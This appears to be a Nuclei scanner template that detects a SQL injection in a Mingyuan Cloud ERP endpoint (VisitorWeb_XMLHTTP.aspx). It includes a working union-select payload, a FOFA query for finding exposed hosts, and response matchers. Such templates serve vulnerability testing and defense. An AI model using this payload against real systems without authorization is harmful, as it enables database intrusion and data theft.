id: mingyuan-erp-visitorweb-xmlhttp-sqli

info:
  name: 明源云 VisitorWeb_XMLHTTP.aspx - SQL Injection
  author: qwtd
  severity: high
  description: |-
    明源云ERP是一款专门为房地产行业设计的企业资源计划（ERP）系统。它旨在帮助房地产公司更有效地管理其业务流程，从项目开发到销售，再到售后服务。该系统集成了财务管理、项目管理、合同管理、采购管理、销售管理等多个模块，提供端到端的解决方案。该系统某接口存在SQL注入漏洞，该漏洞可以直接执行SQL语句并且回显到数据包中。
    FOFA: body="报表服务已正常运行"
  reference:
    - https://mp.weixin.qq.com/s/XmuRwFH1c3uE4bgb73QKsQ
  tags: 明源云-ERP

http:
  - raw:
      - |
        GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1%27+union+select+sum(3233*3323)--+z HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '10743259'
        part: body
